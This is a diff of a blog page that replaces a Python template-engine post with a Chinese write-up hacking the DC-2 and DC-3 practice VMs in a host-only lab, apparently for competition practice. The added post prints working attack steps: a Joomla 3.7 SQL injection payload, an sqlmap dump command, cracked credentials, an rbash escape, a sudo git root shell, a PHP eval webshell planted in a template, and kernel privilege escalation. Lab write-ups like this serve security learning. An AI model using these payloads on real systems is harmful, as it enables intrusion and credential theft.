@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="python,500lines,">
+  <meta name="keywords" content="渗透测试,靶机攻防,">
 
 
 
@@ -79,18 +79,24 @@
 
 
 
-<meta name="description" content="前言&amp;emsp;&amp;emsp;发现一个叫500lines的项目感觉不错，看着自己动手实现一下，这是模板引擎项目的第一篇文章 项目需求介绍&amp;emsp;&amp;emsp;简单得讲一下，这个模板引擎参考了Django的一些语法，主要实现了以下一些内容   解析并打印变量的值 &amp;lt;!–￼2–&amp;gt;和带有内容提取出来转化为html文本，但实际上手感觉还是有不少问题。尤其是循环语句的处理，需要首先将其转为代码，">
-<meta name="keywords" content="python,500lines">
+<meta name="description" content="前言寒假主要主要想打打靶机准备下西普杯的比赛。先打几个简单的靶机熟悉下工具。 环境介绍基本工具 kail 10.211.55.18 使用Parallels wpscan wordpress 信息收集，用户爆破 searchsploit linux提权脚本查询 hashcat 爆破密码hash值 metasploit 综合渗透框架 cewl 根据网页制作字典   nmap 端口扫描，主机发现 dir">
+<meta name="keywords" content="渗透测试,靶机攻防">
 <meta property="og:type" content="article">
-<meta property="og:title" content="简易python模板引擎其一">
-<meta property="og:url" content="http://www.star123.top/2019/08/20/简易python模板引擎其一/index.html">
+<meta property="og:title" content="DC2-3wp">
+<meta property="og:url" content="http://www.star123.top/2020/01/21/DC2-3wp/index.html">
 <meta property="og:site_name" content="star&#39;s blog">
-<meta property="og:description" content="前言&amp;emsp;&amp;emsp;发现一个叫500lines的项目感觉不错，看着自己动手实现一下，这是模板引擎项目的第一篇文章 项目需求介绍&amp;emsp;&amp;emsp;简单得讲一下，这个模板引擎参考了Django的一些语法，主要实现了以下一些内容   解析并打印变量的值 &amp;lt;!–￼2–&amp;gt;和带有内容提取出来转化为html文本，但实际上手感觉还是有不少问题。尤其是循环语句的处理，需要首先将其转为代码，">
+<meta property="og:description" content="前言寒假主要主要想打打靶机准备下西普杯的比赛。先打几个简单的靶机熟悉下工具。 环境介绍基本工具 kail 10.211.55.18 使用Parallels wpscan wordpress 信息收集，用户爆破 searchsploit linux提权脚本查询 hashcat 爆破密码hash值 metasploit 综合渗透框架 cewl 根据网页制作字典   nmap 端口扫描，主机发现 dir">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2019-08-21T10:20:33.253Z">
+<meta property="og:image" content="https://i.loli.net/2020/01/21/7I6BPzseHKiXknM.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/21/OCsKbLlx6kHQB9e.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/21/9eF6uBp3CYTDsa1.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/21/rCVjB5Z62JOqgRN.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/21/287uMgp5snkRSf1.png">
+<meta property="og:updated_time" content="2020-01-21T04:12:22.672Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="简易python模板引擎其一">
-<meta name="twitter:description" content="前言&amp;emsp;&amp;emsp;发现一个叫500lines的项目感觉不错，看着自己动手实现一下，这是模板引擎项目的第一篇文章 项目需求介绍&amp;emsp;&amp;emsp;简单得讲一下，这个模板引擎参考了Django的一些语法，主要实现了以下一些内容   解析并打印变量的值 &amp;lt;!–￼2–&amp;gt;和带有内容提取出来转化为html文本，但实际上手感觉还是有不少问题。尤其是循环语句的处理，需要首先将其转为代码，">
+<meta name="twitter:title" content="DC2-3wp">
+<meta name="twitter:description" content="前言寒假主要主要想打打靶机准备下西普杯的比赛。先打几个简单的靶机熟悉下工具。 环境介绍基本工具 kail 10.211.55.18 使用Parallels wpscan wordpress 信息收集，用户爆破 searchsploit linux提权脚本查询 hashcat 爆破密码hash值 metasploit 综合渗透框架 cewl 根据网页制作字典   nmap 端口扫描，主机发现 dir">
+<meta name="twitter:image" content="https://i.loli.net/2020/01/21/7I6BPzseHKiXknM.png">
 
 
 
@@ -120,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://www.star123.top/2019/08/20/简易python模板引擎其一/">
+  <link rel="canonical" href="http://www.star123.top/2020/01/21/DC2-3wp/">
 
 
 
 
 
-  <title>简易python模板引擎其一 | star's blog</title>
+  <title>DC2-3wp | star's blog</title>
   
 
 
@@ -233,7 +239,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2019/08/20/简易python模板引擎其一/">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/01/21/DC2-3wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="star">
@@ -250,7 +256,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">简易python模板引擎其一</h1>
+          <h1 class="post-title" itemprop="name headline">DC2-3wp</h1>
         
 
         <div class="post-meta">
@@ -262,8 +268,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-20T20:03:47+08:00">
-                2019-08-20
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-21T10:00:50+08:00">
+                2020-01-21
               </time>
             
 
@@ -300,27 +306,92 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;发现一个叫500lines的项目感觉不错，看着自己动手实现一下，这是模板引擎项目的第一篇文章</p>
-<h2 id="项目需求介绍"><a href="#项目需求介绍" class="headerlink" title="项目需求介绍"></a>项目需求介绍</h2><p>&emsp;&emsp;简单得讲一下，这个模板引擎参考了Django的一些语法，主要实现了以下一些内容</p>
-<ul>
-<li> 解析并打印变量的值</li>
-<li>&lt;!–￼2–&gt;和带有内容提取出来转化为html文本，但实际上手感觉还是有不少问题。尤其是循环语句的处理，需要首先将其转为代码，然后再通过程序控制循环内内容的实现。这个项目的核心思路就是找到一种将代码和静态文本混杂的原始文本转化为代码或者纯静态文本。</li>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>寒假主要主要想打打靶机准备下西普杯的比赛。先打几个简单的靶机熟悉下工具。</p>
+<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><ol>
+<li>kail 10.211.55.18 使用Parallels<ul>
+<li>wpscan wordpress 信息收集，用户爆破</li>
+<li>searchsploit linux提权脚本查询</li>
+<li>hashcat 爆破密码hash值</li>
+<li>metasploit 综合渗透框架</li>
+<li>cewl 根据网页制作字典</li>
 </ul>
-<p>&emsp;&emsp;for,if与endfor，endif的闭合可以用栈来处理，参考左右括号的闭合验证。</p>
-<p>&emsp;&emsp;取属性操作可以替换成相应的方法，而过滤器则需要解析成相应方法并逐级嵌套。</p>
-<p>&emsp;&emsp;需要建立一套变量处理机制，尤其是区分局部变量和全局变量，全局变量应该从外部传入。</p>
-<h3 id="python中的一些小窍门"><a href="#python中的一些小窍门" class="headerlink" title="python中的一些小窍门"></a>python中的一些小窍门</h3><ol>
-<li><p>python中有一个类型叫做function对象类型，function对象可以作为参数，返回值和其他对象以相同的方式使用。<br>这里应用500lines说明文档中的原话。</p>
-<p><code>In Python, a method call on an object like result.append(&quot;hello&quot;) is executed in two steps. First, the append attribute is fetched from the result object: result.append. Then the value fetched is invoked as a function, passing it the argument &quot;hello&quot;.</code></p>
-<p>意思是我们调用一个python方法的时候可以将这个python方法保存为一个python对象，然后多次传入参数来执行函数。这个项目中主要用来简化生成代码流程。类似于result_append=result.append，调用时result_append(‘hello’)，将hello添加到结果代码的集合，待后期处理。</p>
 </li>
-<li><p>getattr方法可以用来获取对象中的属性</p>
+<li>nmap 端口扫描，主机发现</li>
+<li>dirsearch 目录爆破</li>
+<li>antsword webshell客户端</li>
+<li>virtual box 主要用来安装靶机</li>
+</ol>
+<h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><ol>
+<li>DC2<ul>
+<li>hostonly模式 192.168.56.105</li>
+<li>wordpress 4.7.10</li>
+<li>apache, Debina 8.10</li>
+</ul>
 </li>
-<li><p>exec方法可以动态执行python代码并可以获取参与运行的全局变量</p>
+<li>DC3<ul>
+<li>hostonly模式 192.168.56.106</li>
+<li>Joomla 3.7 </li>
+<li>ubuntu 16.04 </li>
+</ul>
 </li>
 </ol>
-<h2 id="总结与提高"><a href="#总结与提高" class="headerlink" title="总结与提高"></a>总结与提高</h2><p>&emsp;&emsp;已经完成除了解析注释以外的功能，但觉得还是对python的面向对象理解不充分，尤其是将解析实现全部放在构造器里，对各个类的属性抽取不充分等等。下一版将作出改进。</p>
-<p>&emsp;&emsp;希望能程序能支持，模板继承，自定义标签，还有elif，else等更复杂的逻辑。</p>
+<h2 id="涉及的知识点"><a href="#涉及的知识点" class="headerlink" title="涉及的知识点"></a>涉及的知识点</h2><ol>
+<li>nmap信息收集</li>
+<li>cewl 字典制作</li>
+<li>Joomla 3.7 sql注入</li>
+<li>Joomla template getshell</li>
+<li>rbash 逃逸</li>
+<li>linux提权 sudo su 和doubleput提权漏洞</li>
+</ol>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>DC2</p>
+<ol>
+<li><p>按照flag提示，使用cewl收集字典 wordlist.txt</p>
+</li>
+<li><p>nmap -v -A 192.168.56.105  -p1-10000 采集端口信息 发现<br><img src="https://i.loli.net/2020/01/21/7I6BPzseHKiXknM.png" alt="image.png"><br> 发现ssh和web服务</p>
+</li>
+<li><p>尝试使用wpscan爆破账号密码，最后发现成功爆破两个用户</p>
+<p> Username: jerry, Password: adipiscing</p>
+<p> Username: tom, Password: parturient</p>
+<p> 登录jerry flag2 提示尝试另外的突破点（ps：这里尝试打过wordpress cron upload的漏洞不过好像上传不了文件）</p>
+</li>
+<li><p>使用tom 同密码成功登录<br>echo $SHELL 发现是rbash 尝试使用vi获取bash shell<br>:set shell=/bin/bash :set shell<br>检查/var/backups后发现没有可以读的备份密码 tom也不能使用sudo 故切换到jerry jerry密码也同样</p>
+</li>
+<li><p>sudo -l 发现jerry可以git 故采用git获取rootshell<br>脚本来源于 <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
+<p>sudo git branch –help config<br>!/bin/sh</p>
+<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br><img src="https://i.loli.net/2020/01/21/OCsKbLlx6kHQB9e.png" alt="image.png"></p>
+</li>
+</ol>
+<p>DC3</p>
+<ol>
+<li><p>nmap -v -A 192.168.56.106  -p1-10000 采集端口信息 发现<br><img src="https://i.loli.net/2020/01/21/9eF6uBp3CYTDsa1.png" alt="image.png"></p>
+</li>
+<li><p>dirsearch 发现 README.txt证明版本为3.7，证明有sql注入漏洞 </p>
+<p>参考 <a href="https://paper.seebug.org/305/" target="_blank" rel="noopener">https://paper.seebug.org/305/</a> </p>
+<p>payload: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(2,concat(0x7e,(version())),0)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用sqlmap </p>
+<p>sqlmap –url=’<a href="http://192.168.56.106/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&#39;" target="_blank" rel="noopener">http://192.168.56.106/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&#39;</a> -p ‘list[fullordering]’ -D joomladb -T ‘#__users’ –dump</p>
+<p>获得 账号 admin 密码 $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</p>
+<p>hashcat 爆破获得密码 snoopy</p>
+</li>
+<li><p>登录修改theme<br><a href="http://192.168.56.106/administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=L2luZGV4LnBocA%3D%3D" target="_blank" rel="noopener">http://192.168.56.106/administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=L2luZGV4LnBocA%3D%3D</a></p>
+<p>修改beez3主题</p>
+<p>添加<br>eval($_POST[1]);phpinfo();exit(1);</p>
+<p>访问<a href="http://192.168.56.106/templates/beez3/index.php" target="_blank" rel="noopener">http://192.168.56.106/templates/beez3/index.php</a></p>
+<p><img src="https://i.loli.net/2020/01/21/rCVjB5Z62JOqgRN.png" alt="image.png"></p>
+<p>antsword连接shell</p>
+</li>
+<li><p>上传反弹shell，收集信息</p>
+<p>lsb_release -a</p>
+<p>Ubuntu 16.04 LTS</p>
+<p>uname -a</p>
+<p>4.4.0-21-generic #37</p>
+<p>需要注意的是这个靶机是32位，所以exploit需要x86的</p>
+<p>最后使用searchsploit 找到Ubuntu 16.04 doubleput漏洞，gcc编译最后提权。<br><img src="https://i.loli.net/2020/01/21/287uMgp5snkRSf1.png" alt="image.png"></p>
+</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这两台靶机比较简单，主要是涉及了一些工具的使用，顺带复习了一系列渗透的流程。主要卡的地方是提权的位置，这个部分需要加强。</p>
 
       
     </div>
@@ -338,9 +409,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/python/" rel="tag"># python</a>
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
           
-            <a href="/tags/500lines/" rel="tag"># 500lines</a>
+            <a href="/tags/靶机攻防/" rel="tag"># 靶机攻防</a>
           
         </div>
       
@@ -353,8 +424,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/11/xxe注入入门/" rel="next" title="xxe注入入门">
-                <i class="fa fa-chevron-left"></i> xxe注入入门
+              <a href="/2019/11/24/D3ctfwp/" rel="next" title="D3ctfwp">
+                <i class="fa fa-chevron-left"></i> D3ctfwp
               </a>
             
           </div>
@@ -362,10 +433,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/09/02/shell编程基础/" rel="prev" title="shell编程基础">
-                shell编程基础 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -488,7 +555,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#项目需求介绍"><span class="nav-number">2.</span> <span class="nav-text">项目需求介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python中的一些小窍门"><span class="nav-number">2.1.</span> <span class="nav-text">python中的一些小窍门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结与提高"><span class="nav-number">3.</span> <span class="nav-text">总结与提高</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境介绍"><span class="nav-number">2.</span> <span class="nav-text">环境介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本工具"><span class="nav-number">2.1.</span> <span class="nav-text">基本工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机环境"><span class="nav-number">2.2.</span> <span class="nav-text">靶机环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#涉及的知识点"><span class="nav-number">3.</span> <span class="nav-text">涉及的知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验过程"><span class="nav-number">4.</span> <span class="nav-text">实验过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
